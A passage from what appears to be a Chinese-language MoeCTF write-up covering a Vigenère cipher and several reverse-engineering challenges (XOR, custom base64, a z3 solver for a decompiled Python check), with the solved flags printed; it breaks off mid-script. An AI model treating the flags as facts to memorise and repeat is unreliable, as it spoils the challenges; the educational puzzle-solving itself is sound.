4. oqyqx wlnc vcsbldoaxh hl whlmrldw, xhgwlnhgl rm vnmhzsliy jjoktsmajnd ljfpjrnx vtqojxfr tsg deyfdfjqoawa sajp
5. hgwcshwliy cbd thwdnrnhxx, pvcrhf timpkcgdgyv vk wybxxvvjh nn tigmwbm zgd lnkdyr, vmdiynm zgi lhhaiuxrhil xjohwwpfrnhxx
6. l rgw'n sxqo tgd ngty wcw ofzz nv hgnwsy fwoslehgl wcw ecfxshmw lcoaju dk rhsxwhnlrhf
mt voswxzkiluw cbhl ilnurjkbsh, vujxdfnfn swx oktizkbcngfon uxfktgrmscy sh tiawa atbidiun, jnenfdwb, umw nqymbnqr xwvfmuqwx ri hjmrptuy, swnhonupk biembdmw, ocqxbdgd, nhbkdsoaxh rhkwrsay, kxldg druabqloq, bybnwloq jqzkjqzkb umw yuvawcmz, fqy kx znkyk. ozrm rmfqysaxhsfwdgw gzr gh amangxw gmaeym ud d ramy utwlzlh ie efzn swx qxlxgsccngx wcsc ueyjfo zxq ctyd dk jwbxxvzv, ylnvjvnwm, mshwhy, laumlkhmjnx zgi gzkclnrjg. cgfyuxw, wcw rgoejpzfcusbtq jx jhx lydivjlcl fqy ydcctsfz orngbs di wwnhmd pvq quux qlhacyc xkizuc ce t hxgldld hk fjfccmnfo deylnojpzfc crg'y dygyndw.
```

加密的时候需要密钥, 不过可以暴力破解

[https://www.guballa.de/vigenere-solver](https://www.guballa.de/vigenere-solver)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111356813.png)

```
information security, sometimes shortened to infosec, is the practice of protecting information by mitigating information risks. it is part of information risk management. it typically involves preventing or reducing the probability of unauthorized/inappropriate access to data, or the unlawful use, disclosure, disruption, deletion, corruption, modification, inspection, recording, or devaluation of information. it also involves actions intended to reduce the adverse impacts of such incidents. protected information may take any form, e.g. electronic or physical, tangible (e.g. paperwork) or intangible (e.g. knowledge). information security's primary focus is the balanced protection of the confidentiality, integrity, and availability of data (also known as the cia triad) while maintaining a focus on efficient policy implementation, all without hampering organization productivity. this is largely achieved through a structured risk management process that involves:
1. identifying information and related assets, plus potential threats, vulnerabilities, and impacts;
2. evaluating the risks
3. deciding how to address or treat the risks i.e. to avoid, mitigate, share or accept them
4. where risk mitigation is required, selecting or designing appropriate security controls and implementing them
5. monitoring the activities, making adjustments as necessary to address any issues, changes and improvement opportunities
6. i won't tell you that the flag is moectf attacking the vigenere cipher is interesting
to standardize this discipline, academics and professionals collaborate to offer guidance, policies, and industry standards on password, antivirus software, firewall, encryption software, legal liability, security awareness and training, and so forth. this standardization may be further driven by a wide variety of laws and regulations that affect how data is accessed, processed, stored, transferred and destroyed. however, the implementation of any standards and guidance within an entity may have limited effect if a culture of continual improvement isn't adopted.
```

flag 格式是全部小写 + 下划线分隔

```
moectf{attacking_the_vigenere_cipher_is_interesting}
```

### 叫我棋王

```
1432145551541131233313542541343435232145215423541254443122112521452323
```

尴尬, 忘记怎么写的了...

密钥是 `ghijklmnopqrstuvwxyzabcdef`

## Reverse

### check in

ida 打开直接得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111659225.png)

### Hex

hex 打开

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111702276.png)

### begin

ida F5

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111703654.png)

xor 运算, 密钥是 `0x19u`, u 代表 usigned int, 转成十进制就是 `25`

Str2 内容如下

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111706534.png)

ida 不太会用... 在 hex view 页面复制出来

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111722056.png)

写个脚本解密

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111722363.png)

稍微修正一下就是 flag 了

### Base

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111724428.png)

base64 如下

```
wX/yRrA4RfR2wj72Qv52x3L5qa=
```

在线解密解不出来...

跟进 base64_decode 函数

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111725456.png)

base64char

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111726240.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111735872.png)

c 目前还不太会... 只好照抄 ida 的伪代码然后解密了

```cpp
#include<stdio.h>
#include<string.h>

int base64_decode(char* base64, char* originChar);

int main(void) {
    char base64[29];
    char de64[20];
    strcpy_s(base64, "1wX/yRrA4RfR2wj72Qv52x3L5qa=");
    base64_decode(base64, de64);
    puts(de64);
}

int base64_decode(char* base64, char* originChar)
{
    int v2; // eax
    int v3; // eax
    int v4; // eax
    unsigned __int8 temp[4]; // [rsp+23h] [rbp-Dh] BYREF
    unsigned __int8 k; // [rsp+27h] [rbp-9h]
    int j; // [rsp+28h] [rbp-8h]
    int i; // [rsp+2Ch] [rbp-4h]

    char base64char[65];
    strcpy_s(base64char, "abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ");
    i = 0;
    j = 0;
    while (base64[i])
    {
        memset(temp, 255, sizeof(temp));
        for (k = 0; k <= 0x3Fu; ++k)
        {
            if (base64char[k] == base64[i])
                temp[0] = k;
        }
        for (k = 0; k <= 0x3Fu; ++k)
        {
            if (base64char[k] == base64[i + 1])
                temp[1] = k;
        }
        for (k = 0; k <= 0x3Fu; ++k)
        {
            if (base64char[k] == base64[i + 2])
                temp[2] = k;
        }
        for (k = 0; k <= 0x3Fu; ++k)
        {
            if (base64char[k] == base64[i + 3])
                temp[3] = k;
        }
        v2 = j++;
        originChar[v2] = (temp[1] >> 4) & 3 | (4 * temp[0]);
        if (base64[i + 2] == 61)
            break;
        v3 = j++;
        originChar[v3] = (temp[2] >> 2) & 0xF | (16 * temp[1]);
        if (base64[i + 3] == 61)
            break;
        v4 = j++;
        originChar[v4] = temp[3] & 0x3F | (temp[2] << 6);
        i += 4;
    }
    return j;
}
```

输出如下

```
moectf{qwqbase_qwq}
```

### EquationPy

pyc 先找个网站反编译

[https://tool.lu/pyc/](https://tool.lu/pyc/)

```python
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.8

print('Maybe z3 can help you solve this challenge.')
print('Now give me your flag, and I will check for you.')
flag = input('Input your flag:')
if len(flag) == 22 and ord(flag[0]) * 7072 + ord(flag[1]) * 2523 + ord(flag[2]) * 6714 + ord(flag[3]) * 8810 + ord(flag[4]) * 6796 + ord(flag[5]) * 2647 + ord(flag[6]) * 1347 + ord(flag[7]) * 1289 + ord(flag[8]) * 8917 + ord(flag[9]) * 2304 + ord(flag[10]) * 5001 + ord(flag[11]) * 2882 + ord(flag[12]) * 7232 + ord(flag[13]) * 3192 + ord(flag[14]) * 9676 + ord(flag[15]) * 5436 + ord(flag[16]) * 4407 + ord(flag[17]) * 6269 + ord(flag[18]) * 9623 + ord(flag[19]) * 6230 + ord(flag[20]) * 6292 + ord(flag[21]) * 57 == 10743134 and ord(flag[0]) * 3492 + ord(flag[1]) * 1613 + ord(flag[2]) * 3234 + ord(flag[3]) * 5656 + ord(flag[4]) * 9182 + ord(flag[5]) * 4240 + ord(flag[6]) * 8808 + ord(flag[7]) * 9484 + ord(flag[8]) * 4000 + ord(flag[9]) * 1475 + ord(flag[10]) * 2616 + ord(flag[11]) * 2766 + ord(flag[12]) * 6822 + ord(flag[13]) * 1068 + ord(flag[14]) * 9768 + ord(flag[15]) * 1420 + ord(flag[16]) * 4528 + ord(flag[17]) * 1031 + ord(flag[18]) * 8388 + ord(flag[19]) * 2029 + ord(flag[20]) * 2463 + ord(flag[21]) * 32 == 9663091 and ord(flag[0]) * 9661 + ord(flag[1]) * 1108 + ord(flag[2]) * 2229 + ord(flag[3]) * 1256 + ord(flag[4]) * 7747 + ord(flag[5]) * 5775 + ord(flag[6]) * 5211 + ord(flag[7]) * 2387 + ord(flag[8]) * 1997 + ord(flag[9]) * 4045 + ord(flag[10]) * 7102 + ord(flag[11]) * 7853 + ord(flag[12]) * 5596 + ord(flag[13]) * 6952 + ord(flag[14]) * 8883 + ord(flag[15]) * 5125 + ord(flag[16]) * 9572 + ord(flag[17]) * 1149 + ord(flag[18]) * 7583 + ord(flag[19]) * 1075 + ord(flag[20]) * 9804 + ord(flag[21]) * 72 == 10521461 and ord(flag[0]) * 4314 + ord(flag[1]) * 3509 + ord(flag[2]) * 6200 + ord(flag[3]) * 5546 + ord(flag[4]) * 1705 + ord(flag[5]) * 9518 + ord(flag[6]) * 2975 + ord(flag[7]) * 2689 + ord(flag[8]) * 2412 + ord(flag[9]) * 8659 + ord(flag[10]) * 5459 + ord(flag[11]) * 7572 + ord(flag[12]) * 3042 + ord(flag[13]) * 9701 + ord(flag[14]) * 4697 + ord(flag[15]) * 9863 + ord(flag[16]) * 1296 + ord(flag[17]) * 1278 + ord(flag[18]) * 5721 + ord(flag[19]) * 5116 + ord(flag[20]) * 4147 + ord(flag[21]) * 52 == 9714028 and ord(flag[0]) * 2310 + ord(flag[1]) * 1379 + ord(flag[2]) * 5900 + ord(flag[3]) * 4876 + ord(flag[4]) * 5329 + ord(flag[5]) * 6485 + ord(flag[6]) * 6610 + ord(flag[7]) * 7179 + ord(flag[8]) * 7897 + ord(flag[9]) * 1094 + ord(flag[10]) * 4825 + ord(flag[11]) * 8101 + ord(flag[12]) * 9519 + ord(flag[13]) * 3048 + ord(flag[14]) * 3168 + ord(flag[15]) * 2775 + ord(flag[16]) * 4366 + ord(flag[17]) * 4066 + ord(flag[18]) * 7490 + ord(flag[19]) * 5533 + ord(flag[20]) * 2139 + ord(flag[21]) * 87 == 10030960 and ord(flag[0]) * 1549 + ord(flag[1]) * 8554 + ord(flag[2]) * 6510 + ord(flag[3]) * 6559 + ord(flag[4]) * 5570 + ord(flag[5]) * 1003 + ord(flag[6]) * 8562 + ord(flag[7]) * 6793 + ord(flag[8]) * 3509 + ord(flag[9]) * 4965 + ord(flag[10]) * 6111 + ord(flag[11]) * 1229 + ord(flag[12]) * 5654 + ord(flag[13]) * 2204 + ord(flag[14]) * 2217 + ord(flag[15]) * 5039 + ord(flag[16]) * 5657 + ord(flag[17]) * 9426 + ord(flag[18]) * 7604 + ord(flag[19]) * 5883 + ord(flag[20]) * 5285 + ord(flag[21]) * 17 == 10946682 and ord(flag[0]) * 2678 + ord(flag[1]) * 4369 + ord(flag[2]) * 7509 + ord(flag[3]) * 1564 + ord(flag[4]) * 7777 + ord(flag[5]) * 2271 + ord(flag[6]) * 9696 + ord(flag[7]) * 3874 + ord(flag[8]) * 2212 + ord(flag[9]) * 6764 + ord(flag[10]) * 5727 + ord(flag[11]) * 5971 + ord(flag[12]) * 5876 + ord(flag[13]) * 9959 + ord(flag[14]) * 4604 + ord(flag[15]) * 8461 + ord(flag[16]) * 2350 + ord(flag[17]) * 3564 + ord(flag[18]) * 1831 + ord(flag[19]) * 6088 + ord(flag[20]) * 4575 + ord(flag[21]) * 9 == 10286414 and ord(flag[0]) * 8916 + ord(flag[1]) * 8647 + ord(flag[2]) * 4522 + ord(flag[3]) * 3579 + ord(flag[4]) * 5319 + ord(flag[5]) * 9124 + ord(flag[6]) * 9535 + ord(flag[7]) * 5125 + ord(flag[8]) * 3235 + ord(flag[9]) * 3246 + ord(flag[10]) * 3378 + ord(flag[11]) * 9221 + ord(flag[12]) * 1875 + ord(flag[13]) * 1008 + ord(flag[14]) * 6262 + ord(flag[15]) * 1524 + ord(flag[16]) * 8851 + ord(flag[17]) * 4367 + ord(flag[18]) * 7628 + ord(flag[19]) * 9404 + ord(flag[20]) * 2065 + ord(flag[21]) * 9 == 11809388 and ord(flag[0]) * 9781 + ord(flag[1]) * 9174 + ord(flag[2]) * 3771 + ord(flag[3]) * 6972 + ord(flag[4]) * 6425 + ord(flag[5]) * 7631 + ord(flag[6]) * 8864 + ord(flag[7]) * 9117 + ord(flag[8]) * 4328 + ord(flag[9]) * 3919 + ord(flag[10]) * 6517 + ord(flag[11]) * 7165 + ord(flag[12]) * 6895 + ord(flag[13]) * 3609 + ord(flag[14]) * 3878 + ord(flag[15]) * 1593 + ord(flag[16]) * 9098 + ord(flag[17]) * 6432 + ord(flag[18]) * 2584 + ord(flag[19]) * 8403 + ord(flag[20]) * 4029 + ord(flag[21]) * 30 == 13060508 and ord(flag[0]) * 2511 + ord(flag[1]) * 8583 + ord(flag[2]) * 2428 + ord(flag[3]) * 9439 + ord(flag[4]) * 3662 + ord(flag[5]) * 3278 + ord(flag[6]) * 8305 + ord(flag[7]) * 1100 + ord(flag[8]) * 7972 + ord(flag[9]) * 8510 + ord(flag[10]) * 8552 + ord(flag[11]) * 9993 + ord(flag[12]) * 6855 + ord(flag[13]) * 1702 + ord(flag[14]) * 1640 + ord(flag[15]) * 3787 + ord(flag[16]) * 8161 + ord(flag[17]) * 2110 + ord(flag[18]) * 5320 + ord(flag[19]) * 3313 + ord(flag[20]) * 9286 + ord(flag[21]) * 74 == 10568195 and ord(flag[0]) * 4974 + ord(flag[1]) * 4445 + ord(flag[2]) * 7368 + ord(flag[3]) * 9132 + ord(flag[4]) * 5894 + ord(flag[5]) * 7822 + ord(flag[6]) * 7923 + ord(flag[7]) * 6822 + ord(flag[8]) * 2698 + ord(flag[9]) * 3643 + ord(flag[10]) * 8392 + ord(flag[11]) * 4126 + ord(flag[12]) * 1941 + ord(flag[13]) * 6641 + ord(flag[14]) * 2949 + ord(flag[15]) * 7405 + ord(flag[16]) * 9980 + ord(flag[17]) * 6349 + ord(flag[18]) * 3328 + ord(flag[19]) * 8766 + ord(flag[20]) * 9508 + ord(flag[21]) * 65 == 12514783 and ord(flag[0]) * 4127 + ord(flag[1]) * 4703 + ord(flag[2]) * 6409 + ord(flag[3]) * 4907 + ord(flag[4]) * 5230 + ord(flag[5]) * 3371 + ord(flag[6]) * 5666 + ord(flag[7]) * 3194 + ord(flag[8]) * 5448 + ord(flag[9]) * 8415 + ord(flag[10]) * 4525 + ord(flag[11]) * 4152 + ord(flag[12]) * 1467 + ord(flag[13]) * 5254 + ord(flag[14]) * 2256 + ord(flag[15]) * 1643 + ord(flag[16]) * 9113 + ord(flag[17]) * 8805 + ord(flag[18]) * 4315 + ord(flag[19]) * 8371 + ord(flag[20]) * 1919 + ord(flag[21]) * 2 == 10299950 and ord(flag[0]) * 6245 + ord(flag[1]) * 8783 + ord(flag[2]) * 6059 + ord(flag[3]) * 9375 + ord(flag[4]) * 9253 + ord(flag[5]) * 1974 + ord(flag[6]) * 8867 + ord(flag[7]) * 6423 + ord(flag[8]) * 2577 + ord(flag[9]) * 6613 + ord(flag[10]) * 2040 + ord(flag[11]) * 2209 + ord(flag[12]) * 4147 + ord(flag[13]) * 7151 + ord(flag[14]) * 1011 + ord(flag[15]) * 9446 + ord(flag[16]) * 4362 + ord(flag[17]) * 3073 + ord(flag[18]) * 3006 + ord(flag[19]) * 5499 + ord(flag[20]) * 8850 + ord(flag[21]) * 23 == 11180727 and ord(flag[0]) * 1907 + ord(flag[1]) * 9038 + ord(flag[2]) * 3932 + ord(flag[3]) * 7054 + ord(flag[4]) * 1135 + ord(flag[5]) * 5095 + ord(flag[6]) * 6962 + ord(flag[7]) * 6481 + ord(flag[8]) * 7049 + ord(flag[9]) * 5995 + ord(flag[10]) * 6233 + ord(flag[11]) * 1321 + ord(flag[12]) * 4455 + ord(flag[13]) * 8181 + ord(flag[14]) * 5757 + ord(flag[15]) * 6953 + ord(flag[16]) * 3167 + ord(flag[17]) * 5508 + ord(flag[18]) * 4602 + ord(flag[19]) * 1420 + ord(flag[20]) * 3075 + ord(flag[21]) * 25 == 10167536 and ord(flag[0]) * 1489 + ord(flag[1]) * 9236 + ord(flag[2]) * 7398 + ord(flag[3]) * 4088 + ord(flag[4]) * 4131 + ord(flag[5]) * 1657 + ord(flag[6]) * 9068 + ord(flag[7]) * 6420 + ord(flag[8]) * 3970 + ord(flag[9]) * 3265 + ord(flag[10]) * 5343 + ord(flag[11]) * 5386 + ord(flag[12]) * 2583 + ord(flag[13]) * 2813 + ord(flag[14]) * 7181 + ord(flag[15]) * 9116 + ord(flag[16]) * 4836 + ord(flag[17]) * 6917 + ord(flag[18]) * 1123 + ord(flag[19]) * 7276 + ord(flag[20]) * 2257 + ord(flag[21]) * 65 == 10202212 and ord(flag[0]) * 2097 + ord(flag[1]) * 1253 + ord(flag[2]) * 1469 + ord(flag[3]) * 2731 + ord(flag[4]) * 9565 + ord(flag[5]) * 9185 + ord(flag[6]) * 1095 + ord(flag[7]) * 8666 + ord(flag[8]) * 2919 + ord(flag[9]) * 7962 + ord(flag[10]) * 1497 + ord(flag[11]) * 6642 + ord(flag[12]) * 4108 + ord(flag[13]) * 6892 + ord(flag[14]) * 7161 + ord(flag[15]) * 7552 + ord(flag[16]) * 5666 + ord(flag[17]) * 4060 + ord(flag[18]) * 7799 + ord(flag[19]) * 5080 + ord(flag[20]) * 8516 + ord(flag[21]) * 43 == 10435786 and ord(flag[0]) * 1461 + ord(flag[1]) * 1676 + ord(flag[2]) * 4755 + ord(flag[3]) * 7982 + ord(flag[4]) * 3860 + ord(flag[5]) * 1067 + ord(flag[6]) * 6715 + ord(flag[7]) * 4019 + ord(flag[8]) * 4983 + ord(flag[9]) * 2031 + ord(flag[10]) * 1173 + ord(flag[11]) * 2241 + ord(flag[12]) * 2594 + ord(flag[13]) * 8672 + ord(flag[14]) * 4810 + ord(flag[15]) * 7963 + ord(flag[16]) * 7749 + ord(flag[17]) * 5730 + ord(flag[18]) * 9855 + ord(flag[19]) * 5858 + ord(flag[20]) * 2349 + ord(flag[21]) * 71 == 9526385 and ord(flag[0]) * 9025 + ord(flag[1]) * 9536 + ord(flag[2]) * 1515 + ord(flag[3]) * 8177 + ord(flag[4]) * 6109 + ord(flag[5]) * 4856 + ord(flag[6]) * 6692 + ord(flag[7]) * 4929 + ord(flag[8]) * 1010 + ord(flag[9]) * 3995 + ord(flag[10]) * 3511 + ord(flag[11]) * 5910 + ord(flag[12]) * 3501 + ord(flag[13]) * 3731 + ord(flag[14]) * 6601 + ord(flag[15]) * 6200 + ord(flag[16]) * 8177 + ord(flag[17]) * 5488 + ord(flag[18]) * 5957 + ord(flag[19]) * 9661 + ord(flag[20]) * 4956 + ord(flag[21]) * 48 == 11822714 and ord(flag[0]) * 4462 + ord(flag[1]) * 1940 + ord(flag[2]) * 5956 + ord(flag[3]) * 4965 + ord(flag[4]) * 9268 + ord(flag[5]) * 9627 + ord(flag[6]) * 3564 + ord(flag[7]) * 5417 + ord(flag[8]) * 2039 + ord(flag[9]) * 7269 + ord(flag[10]) * 9667 + ord(flag[11]) * 4158 + ord(flag[12]) * 2856 + ord(flag[13]) * 2851 + ord(flag[14]) * 9696 + ord(flag[15]) * 5986 + ord(flag[16]) * 6237 + ord(flag[17]) * 5845 + ord(flag[18]) * 5467 + ord(flag[19]) * 5227 + ord(flag[20]) * 4771 + ord(flag[21]) * 72 == 11486796 and ord(flag[0]) * 4618 + ord(flag[1]) * 8621 + ord(flag[2]) * 8144 + ord(flag[3]) * 7115 + ord(flag[4]) * 1577 + ord(flag[5]) * 8602 + ord(flag[6]) * 3886 + ord(flag[7]) * 3712 + ord(flag[8]) * 1258 + ord(flag[9]) * 7063 + ord(flag[10]) * 1872 + ord(flag[11]) * 9855 + ord(flag[12]) * 4167 + ord(flag[13]) * 7615 + ord(flag[14]) * 6298 + ord(flag[15]) * 7682 + ord(flag[16]) * 8795 + ord(flag[17]) * 3856 + ord(flag[18]) * 6217 + ord(flag[19]) * 5764 + ord(flag[20]) * 5076 + ord(flag[21]) * 93 == 11540145 and ord(flag[0]) * 7466 + ord(flag[1]) * 8442 + ord(flag[2]) * 4822 + ord(flag[3]) * 7639 + ord(flag[4]) * 2049 + ord(flag[5]) * 7311 + ord(flag[6]) * 5816 + ord(flag[7]) * 8433 + ord(flag[8]) * 5905 + ord(flag[9]) * 4838 + ord(flag[10]) * 1251 + ord(flag[11]) * 8184 + ord(flag[12]) * 6465 + ord(flag[13]) * 4634 + ord(flag[14]) * 5513 + ord(flag[15]) * 3160 + ord(flag[16]) * 6720 + ord(flag[17]) * 9205 + ord(flag[18]) * 6671 + ord(flag[19]) * 7716 + ord(flag[20]) * 1905 + ord(flag[21]) * 29 == 12227250 and ord(flag[0]) * 5926 + ord(flag[1]) * 9095 + ord(flag[2]) * 2048 + ord(flag[3]) * 4639 + ord(flag[4]) * 3035 + ord(flag[5]) * 9560 + ord(flag[6]) * 1591 + ord(flag[7]) * 2392 + ord(flag[8]) * 1812 + ord(flag[9]) * 6732 + ord(flag[10]) * 9454 + ord(flag[11]) * 8175 + ord(flag[12]) * 7346 + ord(flag[13]) * 6333 + ord(flag[14]) * 9812 + ord(flag[15]) * 2034 + ord(flag[16]) * 6634 + ord(flag[17]) * 1762 + ord(flag[18]) * 7058 + ord(flag[19]) * 3524 + ord(flag[20]) * 7462 + ord(flag[21]) * 11 == 11118093:
    print('Congratulate!!!You are right!')
else:
    print('What a pity...Please try again >__<')
```

提示是 z3

```python
from z3 import *

flag = [0] * 22

for i in range(22):
  flag[i] = Int('flag[' + str(i) + ']')

s = Solver()

s.add(flag[0] * 7072 + flag[1] * 2523 + flag[2] * 6714 + flag[3] * 8810 + flag[4] * 6796 + flag[5] * 2647 + flag[6] * 1347 + flag[7] * 1289 + flag[8] * 8917 + flag[9] * 2304 + flag[10] * 5001 + flag[11] * 2882 + flag[12] * 7232 + flag[13] * 3192 + flag[14] * 9676 + flag[15] * 5436 + flag[16] * 4407 + flag[17] * 6269 + flag[18] * 9623 + flag[19] * 6230 + flag[20] * 6292 + flag[21] * 57 == 10743134)
s.add(flag[0] * 3492 + flag[1] * 1613 + flag[2] * 3234 + flag[3] * 5656 + flag[4] * 9182 + flag[5] * 4240 + flag[6] * 8808 + flag[7] * 9484 + flag[8] * 4000 + flag[9] * 1475 + flag[10] * 2616 + flag[11] * 2766 + flag[12] * 6822 + flag[13] * 1068 + flag[14] * 9768 + flag[15] * 1420 + flag[16] * 4528 + flag[17] * 1031 + flag[18] * 8388 + flag[19] * 2029 + flag[20] * 2463 + flag[21] * 32 == 9663091)
s.add(flag[0] * 9661 + flag[1] * 1108 + flag[2] * 2229 + flag[3] * 1256 + flag[4] * 7747 + flag[5] * 5775 + flag[6] * 5211 + flag[7] * 2387 + flag[8] * 1997 + flag[9] * 4045 + flag[10] * 7102 + flag[11] * 7853 + flag[12] * 5596 + flag[13] * 6952 + flag[14] * 8883 + flag[15] * 5125 + flag[16] * 9572 + flag[17] * 1149 + flag[18] * 7583 + flag[19] * 1075 + flag[20] * 9804 + flag[21] * 72 == 10521461)
s.add(flag[0] * 4314 + flag[1] * 3509 + flag[2] * 6200 + flag[3] * 5546 + flag[4] * 1705 + flag[5] * 9518 + flag[6] * 2975 + flag[7] * 2689 + flag[8] * 2412 + flag[9] * 8659 + flag[10] * 5459 + flag[11] * 7572 + flag[12] * 3042 + flag[13] * 9701 + flag[14] * 4697 + flag[15] * 9863 + flag[16] * 1296 + flag[17] * 1278 + flag[18] * 5721 + flag[19] * 5116 + flag[20] * 4147 + flag[21] * 52 == 9714028)
s.add(flag[0] * 2310 + flag[1] * 1379 + flag[2] * 5900 + flag[3] * 4876 + flag[4] * 5329 + flag[5] * 6485 + flag[6] * 6610 + flag[7] * 7179 + flag[8] * 7897 + flag[9] * 1094 + flag[10] * 4825 + flag[11] * 8101 + flag[12] * 9519 + flag[13] * 3048 + flag[14] * 3168 + flag[15] * 2775 + flag[16] * 4366 + flag[17] * 4066 + flag[18] * 7490 + flag[19] * 5533 + flag[20] * 2139 + flag[21] * 87 == 10030960)
s.add(flag[0] * 1549 + flag[1] * 8554 + flag[2] * 6510 + flag[3] * 6559 + flag[4] * 5570 + flag[5] * 1003 + flag[6] * 8562 + flag[7] * 6793 + flag[8] * 3509 + flag[9] * 4965 + flag[10] * 6111 + flag[11] * 1229 + flag[12] * 5654 + flag[13] * 2204 + flag[14] * 2217 + flag[15] * 5039 + flag[16] * 5657 + flag[17] * 9426 + flag[18] * 7604 + flag[19] * 5883 + flag[20] * 5285 + flag[21] * 17 == 10946682)
s.add(flag[0] * 2678 + flag[1] * 4369 + flag[2] * 7509 + flag[3] * 1564 + flag[4] * 7777 + flag[5] * 2271 + flag[6] * 9696 + flag[7] * 3874 + flag[8] * 2212 + flag[9] * 6764 + flag[10] * 5727 + flag[11] * 5971 + flag[12] * 5876 + flag[13] * 9959 + flag[14] * 4604 + flag[15] * 8461 + flag[16] * 2350 + flag[17] * 3564 + flag[18] * 1831 + flag[19] * 6088 + flag[20] * 4575 + flag[21] * 9 == 10286414)
s.add(flag[0] * 8916 + flag[1] * 8647 + flag[2] * 4522 + flag[3] * 3579 + flag[4] * 5319 + flag[5] * 9124 + flag[6] * 9535 + flag[7] * 5125 + flag[8] * 3235 + flag[9] * 3246 + flag[10] * 3378 + flag[11] * 9221 + flag[12] * 1875 + flag[13] * 1008 + flag[14] * 6262 + flag[15] * 1524 + flag[16] * 8851 + flag[17] * 4367 + flag[18] * 7628 + flag[19] * 9404 + flag[20] * 2065 + flag[21] * 9 == 11809388)
s.add(flag[0] * 9781 + flag[1] * 9174 + flag[2] * 3771 + flag[3] * 6972 + flag[4] * 6425 + flag[5] * 7631 + flag[6] * 8864 + flag[7] * 9117 + flag[8] * 4328 + flag[9] * 3919 + flag[10] * 6517 + flag[11] * 7165 + flag[12] * 6895 + flag[13] * 3609 + flag[14] * 3878 + flag[15] * 1593 + flag[16] * 9098 + flag[17] * 6432 + flag[18] * 2584 + flag[19] * 8403 + flag[20] * 4029 + flag[21] * 30 == 13060508)
s.add(flag[0] * 2511 + flag[1] * 8583 + flag[2] * 2428 + flag[3] * 9439 + flag[4] * 3662 + flag[5] * 3278 + flag[6] * 8305 + flag[7] * 1100 + flag[8] * 7972 + flag[9] * 8510 + flag[10] * 8552 + flag[11] * 9993 + flag[12] * 6855 + flag[13] * 1702 + flag[14] * 1640 + flag[15] * 3787 + flag[16] * 8161 + flag[17] * 2110 + flag[18] * 5320 + flag[19] * 3313 + flag[20] * 9286 + flag[21] * 74 == 10568195)
s.add(flag[0] * 4974 + flag[1] * 4445 + flag[2] * 7368 + flag[3] * 9132 + flag[4] * 5894 + flag[5] * 7822 + flag[6] * 7923 + flag[7] * 6822 + flag[8] * 2698 + flag[9] * 3643 + flag[10] * 8392 + flag[11] * 4126 + flag[12] * 1941 + flag[13] * 6641 + flag[14] * 2949 + flag[15] * 7405 + flag[16] * 9980 + flag[17] * 6349 + flag[18] * 3328 + flag[19] * 8766 + flag[20] * 9508 + flag[21] * 65 == 12514783)
s.add(flag[0] * 4127 + flag[1] * 4703 + flag[2] * 6409 + flag[3] * 4907 + flag[4] * 5230 + flag[5] * 3371 + flag[6] * 5666 + flag[7] * 3194 + flag[8] * 5448 + flag[9] * 8415 + flag[10] * 4525 + flag[11] * 4152 + flag[12] * 1467 + flag[13] * 5254 + flag[14] * 2256 + flag[15] * 1643 + flag[16] * 9113 + flag[17] * 8805 + flag[18] * 4315 + flag[19] * 8371 + flag[20] * 1919 + flag[21] * 2 == 10299950)
s.add(flag[0] * 6245 + flag[1] * 8783 + flag[2] * 6059 + flag[3] * 9375 + flag[4] * 9253 + flag[5] * 1974 + flag[6] * 8867 + flag[7] * 6423 + flag[8] * 2577 + flag[9] * 6613 + flag[10] * 2040 + flag[11] * 2209 + flag[12] * 4147 + flag[13] * 7151 + flag[14] * 1011 + flag[15] * 9446 + flag[16] * 4362 + flag[17] * 3073 + flag[18] * 3006 + flag[19] * 5499 + flag[20] * 8850 + flag[21] * 23 == 11180727)
s.add(flag[0] * 1907 + flag[1] * 9038 + flag[2] * 3932 + flag[3] * 7054 + flag[4] * 1135 + flag[5] * 5095 + flag[6] * 6962 + flag[7] * 6481 + flag[8] * 7049 + flag[9] * 5995 + flag[10] * 6233 + flag[11] * 1321 + flag[12] * 4455 + flag[13] * 8181 + flag[14] * 5757 + flag[15] * 6953 + flag[16] * 3167 + flag[17] * 5508 + flag[18] * 4602 + flag[19] * 1420 + flag[20] * 3075 + flag[21] * 25 == 10167536)
s.add(flag[0] * 1489 + flag[1] * 9236 + flag[2] * 7398 + flag[3] * 4088 + flag[4] * 4131 + flag[5] * 1657 + flag[6] * 9068 + flag[7] * 6420 + flag[8] * 3970 + flag[9] * 3265 + flag[10] * 5343 + flag[11] * 5386 + flag[12] * 2583 + flag[13] * 2813 + flag[14] * 7181 + flag[15] * 9116 + flag[16] * 4836 + flag[17] * 6917 + flag[18] * 1123 + flag[19] * 7276 + flag[20] * 2257 + flag[21] * 65 == 10202212)
s.add(flag[0] * 2097 + flag[1] * 1253 + flag[2] * 1469 + flag[3] * 2731 + flag[4] * 9565 + flag[5] * 9185 + flag[6] * 1095 + flag[7] * 8666 + flag[8] * 2919 + flag[9] * 7962 + flag[10] * 1497 + flag[11] * 6642 + flag[12] * 4108 + flag[13] * 6892 + flag[14] * 7161 + flag[15] * 7552 + flag[16] * 5666 + flag[17] * 4060 + flag[18] * 7799 + flag[19] * 5080 + flag[20] * 8516 + flag[21] * 43 == 10435786)
s.add(flag[0] * 1461 + flag[1] * 1676 + flag[2] * 4755 + flag[3] * 7982 + flag[4] * 3860 + flag[5] * 1067 + flag[6] * 6715 + flag[7] * 4019 + flag[8] * 4983 + flag[9] * 2031 + flag[10] * 1173 + flag[11] * 2241 + flag[12] * 2594 + flag[13] * 8672 + flag[14] * 4810 + flag[15] * 7963 + flag[16] * 7749 + flag[17] * 5730 + flag[18] * 9855 + flag[19] * 5858 + flag[20] * 2349 + flag[21] * 71 == 9526385)
